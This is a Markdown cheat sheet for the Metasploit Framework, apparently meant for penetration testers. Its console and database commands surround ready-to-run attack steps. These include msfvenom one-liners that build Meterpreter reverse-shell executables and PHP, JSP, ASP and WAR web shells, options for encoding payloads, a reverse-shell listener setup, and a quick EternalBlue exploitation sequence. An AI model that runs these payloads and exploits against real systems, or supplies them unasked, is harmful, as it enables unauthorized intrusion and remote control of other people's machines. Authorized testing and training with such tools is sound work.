# Metasploit Framework

The most popular exploitation framework.

## Starting Metasploit

```bash
# Start the console
msfconsole

# Start with quiet mode (no banner)
msfconsole -q

# Initialize database (first time)
msfdb init
msfconsole
db_status  # Should show "Connected"
```

---

## Core Workflow

```
1. search <term>      # Find modules
2. use <module>       # Select module
3. show options       # View required settings
4. set <OPTION>       # Configure settings
5. exploit / run      # Execute
```

---

## Essential Commands

### Navigation
| Command | Description |
|:--------|:------------|
| `search <term>` | Search for modules |
| `use <module>` | Select a module |
| `info` | Show module details |
| `back` | Exit current module |
| `exit` | Quit Metasploit |

### Configuration
| Command | Description |
|:--------|:------------|
| `show options` | Display module options |
| `show payloads` | List compatible payloads |
| `set <OPTION> <value>` | Set an option |
| `setg <OPTION> <value>` | Set global option |
| `unset <OPTION>` | Clear an option |

### Execution
| Command | Description |
|:--------|:------------|
| `exploit` or `run` | Execute the module |
| `exploit -j` | Run as background job |
| `jobs` | List background jobs |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with session |

---

## Module Types

| Type | Path | Purpose |
|:-----|:-----|:--------|
| `exploit` | `exploit/...` | Gain access |
| `auxiliary` | `auxiliary/...` | Scanning, fuzzing |
| `post` | `post/...` | Post-exploitation |
| `payload` | `payload/...` | Code to run on target |
| `encoder` | `encoder/...` | Obfuscate payloads |
| `nop` | `nop/...` | NOP sleds |

---

## Common Search Examples

```bash
# Search by service
search vsftpd
search apache
search smb

# Search by CVE
search cve:2021-44228

# Search by type
search type:exploit platform:windows smb

# Search by name
search name:eternalblue
```

---

## Setting Up a Handler (Listener)

For catching reverse shells:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 4444
exploit -j
```

---

## Payload Generation (msfvenom)

Generate payloads outside Metasploit.

### Windows
```bash
# Meterpreter reverse TCP (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Meterpreter reverse TCP (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Stageless (larger but more reliable)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
```

### Linux
```bash
# ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -o shell.py
```

### Web Shells
```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
```

### msfvenom Options
| Option | Description |
|:-------|:------------|
| `-p` | Payload |
| `-f` | Output format (exe, elf, raw, etc.) |
| `-o` | Output file |
| `-e` | Encoder (e.g., x86/shikata_ga_nai) |
| `-i` | Encoder iterations |
| `-b` | Bad characters to avoid |
| `--list formats` | List output formats |
| `--list payloads` | List all payloads |

---

## Popular Exploits

| Module | Target |
|:-------|:-------|
| `exploit/windows/smb/ms17_010_eternalblue` | Windows SMB (EternalBlue) |
| `exploit/unix/ftp/vsftpd_234_backdoor` | vsftpd 2.3.4 |
| `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Shellshock |
| `exploit/windows/smb/psexec` | PSExec with creds |
| `exploit/multi/handler` | Catch reverse shells |

---

## Database Commands

```bash
# Workspace management
workspace                # List workspaces
workspace -a <name>      # Create workspace
workspace <name>         # Switch workspace

# Import scan results
db_import nmap_scan.xml

# View stored data
hosts                    # View hosts
services                 # View services
vulns                    # View vulnerabilities
creds                    # View credentials
```

---

## Quick Reference

```bash
# Quick EternalBlue exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <your_IP>
exploit

# Quick handler setup
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 4444
run -j
```
